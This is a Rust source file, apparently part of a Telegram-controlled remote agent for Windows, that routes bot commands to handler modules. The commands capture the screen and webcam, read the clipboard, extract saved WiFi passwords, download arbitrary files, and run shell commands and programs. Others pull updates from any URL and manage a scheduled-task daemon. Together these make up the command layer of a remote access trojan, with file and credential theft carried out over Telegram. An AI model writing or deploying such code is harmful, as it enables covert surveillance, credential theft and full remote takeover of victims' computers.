use std::sync::Arc;

use anyhow::Result;
use dptree::case;
use teloxide::prelude::*;
use teloxide::types::{ParseMode, ReplyParameters};
use teloxide::utils::command::BotCommands;

use crate::bot::{AgentState, auth, md};

const ACCESS_DENIED: &str = "⛔ Không có quyền truy cập";

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "📋 Commands:")]
pub enum Command {
    #[command(description = "ℹ️ Trợ giúp")]
    Help,
    #[command(description = "🏓 Ping")]
    Ping,
    #[command(description = "📊 Trạng thái")]
    Status,
    #[command(description = "📸 Chụp màn hình")]
    Screenshot,
    #[command(description = "💻 Shell")]
    Shell(String),
    #[command(description = "❌ Hủy job")]
    Cancel,
    #[command(description = "ℹ️ System info")]
    Sysinfo,
    #[command(description = "📷 Camera")]
    Camera,
    #[command(description = "📂 List files")]
    Listfiles(String),
    #[command(description = "⬇️ Get file")]
    Getfile(String),
    #[command(description = "📋 Processes")]
    Procs,
    #[command(description = "💀 Kill")]
    Kill(String),
    #[command(description = "🌐 Netstat")]
    Netstat,
    #[command(description = "📋 Clipboard")]
    Clipboard,
    #[command(description = "📍 Location")]
    Location,
    #[command(description = "🖼️ Wallpaper")]
    Wallpaper,
    #[command(description = "🔒 Lock screen")]
    Lock,
    #[command(description = "⏻ Shutdown")]
    Shutdown,
    #[command(description = "🔄 Restart")]
    Restart,
    #[command(description = "⛔ Abort shutdown")]
    Abortshutdown,
    #[command(description = "▶️ Run program")]
    Run(String),
    #[command(description = "📜 History")]
    History,
    #[command(description = "🗑️ Uninstall")]
    Uninstall,
    #[command(description = "⬆️ Update")]
    Update(String),
    #[command(description = "📶 WiFi đã lưu")]
    Wifi,
    #[command(description = "🔇 Tắt âm")]
    Mute,
    #[command(description = "🔊 Bật âm")]
    Unmute,
    #[command(description = "🔊 Volume")]
    Volume(String),
    #[command(description = "💬 MessageBox")]
    Msgbox(String),
    #[command(description = "🛑 Stop daemon")]
    Stop,
    #[command(description = "🚪 Exit")]
    Exit,
}

pub type HandlerResult = Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>;

pub fn schema()
-> teloxide::dispatching::UpdateHandler<Box<dyn std::error::Error + Send + Sync + 'static>> {
    let command_handler = teloxide::filter_command::<Command, _>()
        .branch(case![Command::Help].endpoint(help))
        .branch(case![Command::Ping].endpoint(ping))
        .branch(case![Command::Status].endpoint(status))
        .branch(case![Command::Screenshot].endpoint(screenshot))
        .branch(case![Command::Shell(cmd)].endpoint(shell_cmd))
        .branch(case![Command::Cancel].endpoint(cancel))
        .branch(case![Command::Sysinfo].endpoint(sysinfo))
        .branch(case![Command::Camera].endpoint(camera))
        .branch(case![Command::Listfiles(path)].endpoint(listfiles))
        .branch(case![Command::Getfile(path)].endpoint(getfile))
        .branch(case![Command::Procs].endpoint(procs))
        .branch(case![Command::Kill(pid)].endpoint(kill))
        .branch(case![Command::Netstat].endpoint(netstat))
        .branch(case![Command::Clipboard].endpoint(clipboard))
        .branch(case![Command::Location].endpoint(location))
        .branch(case![Command::Wallpaper].endpoint(wallpaper))
        .branch(case![Command::Lock].endpoint(lock))
        .branch(case![Command::Shutdown].endpoint(shutdown))
        .branch(case![Command::Restart].endpoint(restart))
        .branch(case![Command::Abortshutdown].endpoint(abortshutdown))
        .branch(case![Command::Run(path)].endpoint(run_program))
        .branch(case![Command::History].endpoint(history))
        .branch(case![Command::Uninstall].endpoint(uninstall))
        .branch(case![Command::Update(args)].endpoint(update))
        .branch(case![Command::Wifi].endpoint(wifi))
        .branch(case![Command::Mute].endpoint(mute))
        .branch(case![Command::Unmute].endpoint(unmute))
        .branch(case![Command::Volume(level)].endpoint(volume))
        .branch(case![Command::Msgbox(text)].endpoint(msgbox))
        .branch(case![Command::Stop].endpoint(stop))
        .branch(case![Command::Exit].endpoint(exit));

    Update::filter_message().branch(command_handler)
}

fn get_user_id(msg: &Message) -> i64 {
    msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0)
}

async fn reply(bot: &Bot, msg: &Message, text: impl Into<String>) -> Result<()> {
    bot.send_message(msg.chat.id, md::escape(&text.into()))
        .parse_mode(ParseMode::MarkdownV2)
        .reply_parameters(ReplyParameters::new(msg.id))
        .await?;
    Ok(())
}

/// Check authorization; sends access denied message and returns false if unauthorized.
async fn ensure_authorized(bot: &Bot, msg: &Message, state: &AgentState) -> Result<bool> {
    if !auth::is_authorized(get_user_id(msg), state.super_user_id) {
        md::send(bot, msg.chat.id, msg.id, ACCESS_DENIED.to_string()).await?;
        return Ok(false);
    }
    Ok(true)
}

/// Log command execution with user context for audit trail.
fn log_command(msg: &Message, command: &str) {
    let uid = msg.from.as_ref().map(|u| u.id.0).unwrap_or(0);
    let username = msg
        .from
        .as_ref()
        .and_then(|u| u.username.as_deref())
        .unwrap_or("?");
    let chat_id = msg.chat.id.0;
    log::info!("CMD /{command} from @{username} (uid={uid}, chat={chat_id})");
}

/// Check rate limit; sends cooldown message and returns false if limited.
fn check_rate_limit(state: &AgentState, command: &str) -> Result<(), String> {
    state
        .rate_limiter
        .check(command)
        .map_err(|secs| format!("⏳ Cooldown {secs}s"))
}

fn help_text() -> String {
    let mut t = String::new();
    t.push_str("*🤖 TG Remote Bot*\n\n");
    t.push_str("*── 📍 Điều khiển ──*\n");
    t.push_str("/help \\- Trợ giúp\n");
    t.push_str("/ping \\- Pong \\+ uptime \\+ IP\n");
    t.push_str("/status \\- PID \\+ uptime \\+ job\n\n");
    t.push_str("*── 📸 Thu thập thông tin ──*\n");
    t.push_str("/screenshot \\- Chụp màn hình\n");
    t.push_str("/camera \\- Chụp webcam\n");
    t.push_str("/sysinfo \\- CPU\\, RAM\\, Disk\n");
    t.push_str("/clipboard \\- Đọc clipboard\n");
    t.push_str("/location \\- Vị trí IP\n");
    t.push_str("/netstat \\- Kết nối mạng\n");
    t.push_str("/wifi \\- WiFi đã lưu \\+ mật khẩu\n");
    t.push_str("/wallpaper \\- Hình nền\n\n");
    t.push_str("*── 📂 File \\& Process ──*\n");
    t.push_str("/listfiles _\\<path\\>_ \\- Liệt kê file\n");
    t.push_str("/getfile _\\<path\\>_ \\- Tải file\n");
    t.push_str("/procs \\- Danh sách process\n");
    t.push_str("/kill _\\<pid\\>_ \\- Kill process\n");
    t.push_str("/run _\\<path\\>_ \\- Chạy chương trình\n\n");
    t.push_str("*── 💻 Shell ──*\n");
    t.push_str("/shell _\\<cmd\\>_ \\- Chạy lệnh\n");
    t.push_str("/cancel \\- Hủy job\n\n");
    t.push_str("*── ⏻ Hệ thống ──*\n");
    t.push_str("/lock \\- Khóa màn hình\n");
    t.push_str("/mute \\- Tắt âm\n");
    t.push_str("/unmute \\- Bật âm\n");
    t.push_str("/volume _\\<0\\-100\\>_ \\- Chỉnh âm lượng\n");
    t.push_str("/msgbox _\\<text\\>_ \\- Hiện MessageBox\n");
    t.push_str("/shutdown \\- Tắt máy\n");
    t.push_str("/restart \\- Khởi động lại\n");
    t.push_str("/abortshutdown \\- Hủy tắt máy\n\n");
    t.push_str("*── 🤖 Agent ──*\n");
    t.push_str("/history \\- Lịch sử\n");
    t.push_str("/uninstall \\- Gỡ agent\n");
    t.push_str("/update _\\[url\\]_ \\- Cập nhật từ URL hoặc GitHub\n");
    t.push_str("/stop \\- Dừng daemon \\(Task Scheduler\\)\n");
    t.push_str("/exit \\- Tắt agent\n");
    t
}

// ─── Command Handlers ───────────────────────────────────────────────────────

async fn help(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "help");
    reply(&bot, &msg, help_text()).await?;
    Ok(())
}

async fn ping(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "ping") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "ping");
    crate::commands::ping::ping(&bot, msg.chat.id, msg.id, &state).await?;
    Ok(())
}

async fn status(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "status") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "status");
    crate::commands::status::status(&bot, msg.chat.id, msg.id, &state).await?;
    Ok(())
}

async fn screenshot(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "screenshot") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "screenshot");
    crate::commands::screenshot::screenshot(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn shell_cmd(bot: Bot, msg: Message, state: Arc<AgentState>, cmd: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if cmd.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /shell _\\<lệnh\\_>").await?;
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "shell") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, &format!("shell {}", cmd));
    crate::commands::shell::shell(&bot, msg.chat.id, msg.id, &state.active_job, &cmd).await?;
    Ok(())
}

async fn cancel(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "cancel");
    let handle = {
        let mut job = state.active_job.lock().unwrap_or_else(|e| e.into_inner());
        job.take().map(|r| r.handle)
    };
    if let Some(handle) = handle {
        handle.abort();
        reply(&bot, &msg, "✅ Job đã hủy").await?;
    } else {
        reply(&bot, &msg, "ℹ️ Không có job nào đang chạy").await?;
    }
    Ok(())
}

async fn sysinfo(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "sysinfo") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "sysinfo");
    crate::commands::sysinfo::sysinfo(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn camera(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "camera") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "camera");
    crate::commands::camera::camera(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn listfiles(bot: Bot, msg: Message, state: Arc<AgentState>, path: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /listfiles _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "listfiles") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, &format!("listfiles {path}"));
    crate::commands::files::listfiles(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn getfile(bot: Bot, msg: Message, state: Arc<AgentState>, path: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /getfile _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "getfile") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, &format!("getfile {path}"));
    crate::commands::files::getfile(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn procs(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "procs") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "procs");
    crate::commands::procs::procs(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn kill(bot: Bot, msg: Message, state: Arc<AgentState>, pid: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if pid.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /kill _\\<pid\\_>").await?;
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "kill") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, &format!("kill {pid}"));
    let pid: u32 = match pid.trim().parse() {
        Ok(p) => p,
        Err(_) => {
            reply(&bot, &msg, "❌ PID không hợp lệ\\, phải là số").await?;
            return Ok(());
        }
    };
    crate::commands::procs::kill_process(&bot, msg.chat.id, msg.id, pid).await?;
    Ok(())
}

async fn netstat(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "netstat") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "netstat");
    crate::commands::network::netstat(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn clipboard(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "clipboard") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "clipboard");
    crate::commands::clipboard::clipboard(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn location(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "location") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "location");
    crate::commands::location::location(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn wallpaper(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "wallpaper") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "wallpaper");
    crate::commands::wallpaper::wallpaper(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn lock(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "lock") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "lock");
    crate::commands::system::lock_screen(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn shutdown(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "shutdown") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "shutdown");
    crate::commands::system::shutdown(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn restart(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "restart") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "restart");
    crate::commands::system::restart(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn abortshutdown(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "abortshutdown") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "abortshutdown");
    crate::commands::system::abort_shutdown(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn run_program(
    bot: Bot,
    msg: Message,
    state: Arc<AgentState>,
    path: String,
) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /run _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "run") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, &format!("run {path}"));
    crate::commands::system::run_program(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn history(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "history") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "history");
    reply(&bot, &msg, "ℹ️ History chưa được implement").await?;
    Ok(())
}

async fn uninstall(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "uninstall");
    match crate::service::install::uninstall() {
        Ok(_) => reply(&bot, &msg, "✅ Agent đã gỡ bỏ").await?,
        Err(e) => reply(&bot, &msg, format!("❌ Gỡ bỏ thất bại: {e}")).await?,
    }
    Ok(())
}

async fn update(bot: Bot, msg: Message, state: Arc<AgentState>, args: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "update") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "update");

    let url = if args.trim().is_empty() {
        reply(&bot, &msg, "🔍 Đang kiểm tra version từ GitHub\\.\\.\\.").await?;
        match crate::updater::self_update::resolve_update_url().await {
            Ok(Some(url)) => url,
            Ok(None) => {
                reply(&bot, &msg, "✅ Đang dùng version mới nhất").await?;
                return Ok(());
            }
            Err(e) => {
                reply(&bot, &msg, format!("❌ Không check được version: {e}")).await?;
                return Ok(());
            }
        }
    } else {
        args.trim().to_string()
    };

    reply(&bot, &msg, "⬇️ Đang tải về và cập nhật\\.\\.\\.").await?;
    if let Err(e) = crate::updater::self_update::self_update(&url).await {
        reply(&bot, &msg, format!("❌ Cập nhật thất bại: {e}")).await?;
    }
    Ok(())
}

async fn wifi(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if let Err(e) = check_rate_limit(&state, "wifi") {
        reply(&bot, &msg, e).await?;
        return Ok(());
    }
    log_command(&msg, "wifi");
    crate::commands::wifi::wifi(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn mute(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "mute");
    crate::commands::audio::mute(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn unmute(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "unmute");
    crate::commands::audio::unmute(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn volume(bot: Bot, msg: Message, state: Arc<AgentState>, level: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    let level: u8 = match level.trim().parse() {
        Ok(v) => v,
        Err(_) => {
            reply(&bot, &msg, "⚠️ Cú pháp: /volume _\\<0\\-100\\>_").await?;
            return Ok(());
        }
    };
    log_command(&msg, &format!("volume {level}"));
    crate::commands::audio::set_volume_cmd(&bot, msg.chat.id, msg.id, level).await?;
    Ok(())
}

async fn msgbox(bot: Bot, msg: Message, state: Arc<AgentState>, text: String) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    if text.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /msgbox _\\<text\\>_").await?;
        return Ok(());
    }
    log_command(&msg, "msgbox");
    crate::commands::msgbox::msgbox(&bot, msg.chat.id, msg.id, &text).await?;
    Ok(())
}

async fn stop(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "stop");
    reply(&bot, &msg, "🛑 Đang dừng daemon\\.\\.\\.").await?;
    if let Err(e) = crate::service::scheduler::stop() {
        reply(&bot, &msg, format!("❌ Stop failed: {e}")).await?;
    }
    Ok(())
}

async fn exit(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !ensure_authorized(&bot, &msg, &state).await? {
        return Ok(());
    }
    log_command(&msg, "exit");
    reply(&bot, &msg, "🚪 Tắt agent\\.\\.\\.").await?;
    std::process::exit(0);
}
